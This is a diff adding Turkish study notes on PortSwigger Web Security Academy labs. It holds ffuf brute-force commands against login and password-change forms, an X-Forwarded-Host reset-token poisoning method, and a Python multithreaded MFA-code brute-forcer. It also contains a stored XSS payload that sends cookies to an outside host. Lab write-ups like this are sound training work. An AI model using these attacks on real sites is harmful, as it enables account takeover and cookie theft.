@@ -85,3 +85,183 @@ stay logged in olabilmek için bize bir id oluşturuluyor bu id yi base 64 decod
 ```bash
 ffuf -w md5_hashes.txt -b "stay-logged-in=FUZZ; session=ad" -u https://0a5a0060034dcb649a9c849500b30004.web-security-academy.net/my-account?id=carlos -mr "carlos"
 ```
+
+## Lab 10 (XSS) 
+
+Labın içerisindeki postlarda stored XSS açığı var ve `stay-logged-ing` cookiesinde `http-only` olarak işaretlenmemiş bu sayede 
+```HTML title:"XSS no CORS fetch"
+<script>
+  fetch('https://myserver.com/exploit?' + 'document.cookie', {
+  method: 'POST',
+  });
+</script>
+```
+injecte edildiğinde girdiğimiz urlye `stay-logged-in` cookiesi ile bir istek yollar.
+
+bu cookie ile giriş yapabilriz.
+
+## Lab 11 (X-Forwarded-Host)
+[[X-Forwarded-]]
+`X-Forwarded-Host` başlığı kullanılarak sunucunun host başlığına bakarak `host/forget-password?token=` şeklinde attığı maili yönetmemizi sağlar. 
+`X-Forwarded-Host` başlığını kendi server adresimizi verirsek maildeki link bizim sunucumuzu gösterir. Eğer hesap sahibi mailindeki linke tıklar ise sunucu loglarında `/forget-password?token={token}` şeklinde bir istek düşer.
+Bu token kullanılarak diğer hesabın şifresi değiştilebilir.
+
+## Lab 12 (change-password)
+`Current password `değerini kontrol ediyor doğru değilse "`Current password is incorrect`" dönüyor username değeri ve değiştirilecek şifreyi alıyor ancak farklı bir hesapla giriş yapılırsa yani session değeri username in değilse değiştirme işlemini yapmıyor. Session değerini de dahil ederek brute-force atılması gerekiyor password1 ve password2 değerlerinin de farklı olması gerekiyor aynı olursa da kabul etmiyor.
+
+payload:
+```bash
+ffuf -w passwords -u https://0a0a005504429c3f818fca58003000c1.web-security-academy.net/my-account/change-password -d "username=carlos&current-password=FUZZ&new-password-1=asd&new-password-2=peter" -b "session=UEEMqscwXcd1Njz56APbopsW3zQ1qefO" -fr "Current password is incorrect"
+```
+
+## Lab 13 (Json)
+Json verisi içerisinde bir dizi verdim ve sunucu bu dizideki tüm şifreleri denedi giriş yaptı ve yönlendirdi.
+
+## Lab 14 ()
+![[Pasted image 20250329051300.png]]
+
+tablo bu şekilde olmalı sırasıyla istekler atılarak brute force denenmeli bunu yapan python kodu : 
+
+```python
+import requests
+
+from bs4 import BeautifulSoup
+
+import threading
+
+import time
+
+from concurrent.futures import ThreadPoolExecutor
+
+  
+
+# URL ve oturum
+
+url = "https://0a3e00730439aa2d83e58c06007200e5.web-security-academy.net"
+
+session = requests.Session()
+
+found_code = None
+
+lock = threading.Lock()  # Thread güvenliği için kilit mekanizması
+
+  
+
+# CSRF token'ı almak
+
+def get_csrf_token(response):
+
+    soup = BeautifulSoup(response.text, "html.parser")
+
+    csrf_token = soup.find("input", {"name": "csrf"})["value"]
+
+    return csrf_token
+
+  
+
+# Login işlemi ve MFA kodu denemesi
+
+def try_mfa_code(mfa_code):
+
+    global found_code
+
+    # Eğer kod zaten bulunduysa diğer thread'lerin çalışmasını durdur
+
+    if found_code:
+
+        return
+
+    try:
+
+        local_session = requests.Session()
+
+        login_response = local_session.get(url+"/login")
+
+        login_csrf_token = get_csrf_token(login_response)
+
+  
+
+        login2_response = local_session.post(url + "/login", data={
+
+            "username": "carlos",
+
+            "password": "montoya",
+
+            "csrf": login_csrf_token
+
+        })
+
+        login2_csrf_token = get_csrf_token(login2_response)
+
+  
+
+        last_response = local_session.post(url + "/login2", data={
+
+            "mfa-code": str(mfa_code).zfill(4),  # 4 haneli formatta gönder
+
+            "csrf": login2_csrf_token
+
+        })
+
+        print(f"MFA kodu denendi: {mfa_code}")
+
+        if last_response.status_code == 302 or "carlos" in last_response.text :
+
+            with lock:
+
+                found_code = mfa_code
+
+                cookies_dict = local_session.cookies.get_dict()
+
+                success_info = {
+
+                    "message": f"Doğru kod bulundu: {mfa_code}",
+
+                    "url": url,
+
+                    "cookies": cookies_dict,
+
+                    "session": local_session
+
+                }
+
+                print(f"Doğru kod bulundu: {mfa_code}")
+
+                print("URL:", url)
+
+                print("Cookies:", cookies_dict)
+
+    except Exception as e:
+
+        print(f"Hata oluştu ({mfa_code}): {str(e)}")
+
+  
+
+# Multi-threading işlemi
+
+def main():
+
+    # MFA kodlarını oluştur (1000-9999)
+
+    codes = list(range(1000, 10000))
+
+    # ThreadPoolExecutor ile aynı anda sadece 5 thread çalıştır
+
+    with ThreadPoolExecutor(max_workers=500) as executor:
+
+        for result in executor.map(try_mfa_code, codes):
+
+            # Eğer doğru kod bulunduysa işlemi durdur
+
+            if found_code:
+
+                executor._threads.clear()
+
+                break
+
+  
+
+if __name__ == "__main__":
+
+    main()
+```
